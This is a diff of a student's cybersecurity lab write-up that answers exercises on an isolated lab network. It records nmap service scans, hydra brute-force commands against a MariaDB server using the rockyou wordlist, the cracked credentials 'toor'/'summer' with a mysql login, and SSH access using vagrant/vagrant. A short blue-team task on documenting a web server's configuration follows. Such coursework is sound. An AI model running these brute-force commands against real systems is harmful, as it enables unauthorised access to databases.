@@ -68,6 +68,8 @@ PORT STATE SERVICE
 
 **What database software is running on the database machine? What version?**
 
+`nmap -sV 172.30.0.15`
+
 PORT STATE SERVICE VERSION
 22/tcp open ssh OpenSSH 9.3 (protocol 2.0)
 3306/tcp open mysql MariaDB 5.5.5-10.11.11
@@ -75,11 +77,23 @@ PORT STATE SERVICE VERSION
 **Try to search for a nmap script to brute-force the database. Another (even easier tool) is called hydra (https://github.com/vanhauser-thc/thc-hydra). Search online for a good wordlist. For example "rockyou" or https://github.com/danielmiessler/SecLists We suggest to try the default username of the database software and attack the database machine. Another interesting username worth a try is "toor".**
 
 1. I found the rockyou wordlist but it is still zipped -> `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`
-2. Hydra is already installed on Kali linux. I used `hydra -l root -P /usr/share/wordlists/rockyou.txt -s 3306 -f -t 16 -W 1 172.30.0.15 mysql`.
+2. Hydra is already installed on Kali linux. I used `hydra -l root -P /usr/share/wordlists/rockyou.txt -s 3306 -f -t 16 -W 1 172.30.0.15 mysql`. That didn't work.
+3. For the second try I used `hydra -l toor -P /usr/share/wordlists/rockyou.txt -s 3306 -f -t 16 -W 1 172.30.0.15 mysql`. This time it worked!
+4. I got the credentials "toor" "summer"
+5. To check I logged in `mysql -h 172.30.0.15 -u toor -psummer` and I'm in.
 
-Try to SSH (using vagrant/vagrant) from red to another machine. Is this possible?
-What webserver software is running on web?
-Try the -sC option with nmap. Do you remember what this option is?
+**Try to SSH (using vagrant/vagrant) from red to another machine. Is this possible?**
+
+I tried to ssh in the db. This worked. Same for the web.
+
+**What webserver software is running on web?**
+
+I will use nmap for this. `nmap -sV 172.30.0.10` --> Apache httpd 2.4.62 ((AlmaLinux))
+
+**Try the -sC option with nmap. Do you remember what this option is?**
+
+The -sC option in nmap runs the default script scan. It executes Nmap's most common and useful scripts against the target.
+
 Important: after trying to figure this one out using nmap from the red machine. Shift your view from a red teamer to a blue teamer. Log in to the web machine and try to figure out, in detail (!), how the webserver is configured. What software is used? Is it static content? Is there java, c#, .NET, php, nodejs... ? Are systemd-unit files used as services? Document this properly!
 
 Network Segmentation¶
